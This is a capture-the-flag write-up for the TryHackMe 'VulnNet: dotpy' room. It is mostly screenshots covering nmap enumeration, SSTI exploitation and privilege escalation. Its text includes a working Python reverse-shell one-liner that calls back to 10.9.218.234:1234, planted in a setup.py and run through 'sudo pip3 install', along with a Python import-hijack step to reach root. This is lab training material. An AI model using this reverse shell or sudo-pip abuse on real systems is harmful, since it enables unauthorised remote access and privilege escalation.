Link room: https://tryhackme.com/room/vulnnetdotpy

# ENUMERATING
## using nmap
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/7b5adbc7-ab79-41b1-aee7-0db482da1c2f)

=> domain vulnnet.com

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/b1edb4fe-dc65-4b81-bd78-6dac38d926bd)
## view web
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/640e7391-8fb8-44d3-bd19-afebda47d021)

I try registering an account 

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/fbb18a4c-3345-4668-a83e-d52574552565)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/c9737394-e431-42bc-adfd-d15fd96f0e3d)

=> Logged in successfully!!
# EXPLOITING
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8798a325-512b-4dbf-90ed-423cedd72070)

=> I see the line "No results for {4+3}" 

I search on google with keyword "ssti payload exploit"

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8758d12a-4d23-4ca1-9a01-e5b46082c50a)

Using CyberChef website to tranfer reverse command to hex

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/40a9c6db-1da6-4323-b74f-5d2806d73033)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/f9350e5a-56f7-407f-8664-3436f18e2660)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/66af16ce-fd11-43b6-959b-63abe8c193cb)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/41fda77d-dfc3-45a6-8b4d-bdf5eae12b38)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/eb553201-70bc-4e80-9e15-4f7691ef72e9)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/aa114201-ee0d-45b1-9307-1eef343758c8)

## using ```sudo -nl```
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/f589904b-eb98-480d-9e62-6dd133807839)

I search on google with keyword "pip3 install * exploit" and find something similar. If it's as they say, I can also get a reverse shell by editing the setup.py file

So I go to "pentestmonkey.net" website 

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/9a8b0bed-2203-4c6b-ac5a-a85f65d43f4b)

Creating directory named temp in /tmp. I run command 
```echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.218.234",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > setup.py"``` to create setup.py file

Then I run command ```sudo -u system-adm /usr/bin/pip3 install .``` and ```nc``` to get revershell

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8a5b8585-7642-4786-9087-fbeed3f7798c)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/c7fb8da1-7225-4fec-8356-4b5017c9956d)

=> user.txt
# PRIVILEGE ESCALATION
## using ```sudo -nl```
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/099575b4-36f2-465f-a8bb-7a5a2a75a1a1)

Reading /opt/backup.py
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/e2941763-d0b1-4d83-ae13-3249b0dfe2c8)

I go to /tmp and create zipfile.py

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/99655343-1463-4acc-8731-2303a37a0670)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/7e51b0cb-d8d2-4b15-9be6-a436dd8c7b7d)

=> root.txt
## Done!!!
Thanks for reading. Bye!
